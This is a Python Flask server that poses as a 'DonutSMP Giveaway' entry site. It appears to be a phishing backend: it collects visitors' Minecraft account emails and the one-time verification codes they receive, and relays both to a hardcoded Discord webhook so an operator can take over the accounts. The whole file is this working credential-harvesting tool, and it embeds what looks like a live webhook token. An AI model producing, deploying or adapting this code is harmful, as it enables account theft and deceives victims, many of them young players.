from flask import Flask, request, jsonify, send_from_directory
import aiohttp
import asyncio
import re
from datetime import datetime
import discord
from discord import AsyncWebhookAdapter

app = Flask(__name__, static_folder='.')

# === YOUR WEBHOOK (already correct) ===
WEBHOOK_URL = "https://discord.com/api/webhooks/1439990429226369166/lJgEK_CeiR5qkbvXsFCLwmHH7jVoS_wx0IT97nPMyvPXnbltCKfV1b27urEmg-DnWJwr"

# Stores pending verifications (email → data)
pending = {}

# Home page – serves index.html from the root folder
@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

# Step 1: User submits email
@app.route('/submit_email', methods=['POST'])
def submit_email():
    try:
        data = request.get_json()
        email = data.get('email', '').strip().lower()
        discord_tag = data.get('discord', '').strip()

        if not email or '@' not in email or '.' not in email:
            return jsonify({"error": "Invalid email"}), 400

        if email in pending:
            return jsonify({"error": "This email is already in progress"}), 400

        pending[email] = {"discord": discord_tag or "Not provided", "user_code": None}

        message = f"""
**NEW GIVEAWAY ENTRY – SEND CODE**
**Minecraft Email:** `{email}`
**Discord:** {discord_tag or "None"}
**Time:** {datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}
@everyone
        """
        asyncio.create_task(send_webhook(message.strip()))
        return jsonify({"success": True})
    except Exception as e:
        print(f"ERROR in submit_email: {e}")
        return jsonify({"error": "Something went wrong"}), 500

# Step 2: User submits the 6-digit code
@app.route('/submit_code', methods=['POST'])
def submit_code():
    try:
        data = request.get_json()
        email = data.get('email', '').strip().lower()
        code = data.get('code', '').strip()

        if email not in pending:
            return jsonify({"error": "No verification started for this email"}), 400

        info = pending[email]

        # First time they submit a code → store it and ping you
        if info["user_code"] is None:
            info["user_code"] = code
            message = f"""
**CODE RECEIVED – CHECK IT**
**Email:** `{email}`
**Code they entered:** `{code}`
**Discord:** {info["discord"]}

Send the exact same code to their email to approve them!
            """
            asyncio.create_task(send_webhook(message.strip()))
            return jsonify({"wait": True, "msg": "Code received! Waiting for admin approval..."})

        # They submitted the correct code the second time → SUCCESS
        if info["user_code"] == code:
            message = f"""
**GIVEAWAY ENTRY SUCCESSFUL**
**Minecraft Email:** `{email}`
**Code:** `{code}`
**Discord:** {info["discord"]}
This player is now officially entered!
            """
            asyncio.create_task(send_webhook(message.strip()))
            del pending[email]
            return jsonify({"verified": True})

        return jsonify({"error": "Wrong code"}), 400
    except Exception as e:
        print(f"ERROR in submit_code: {e}")
        return jsonify({"error": "Something went wrong"}), 500

# Send to Discord with error handling
async def send_webhook(content):
    try:
        async with aiohttp.ClientSession() as session:
            webhook = discord.Webhook.from_url(WEBHOOK_URL, adapter=AsyncWebhookAdapter(session))
            await webhook.send(f"@everyone\n{content}", username="DonutSMP Giveaway")
            print("Webhook sent!")
    except Exception as e:
        print(f"WEBHOOK FAILED: {e}")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
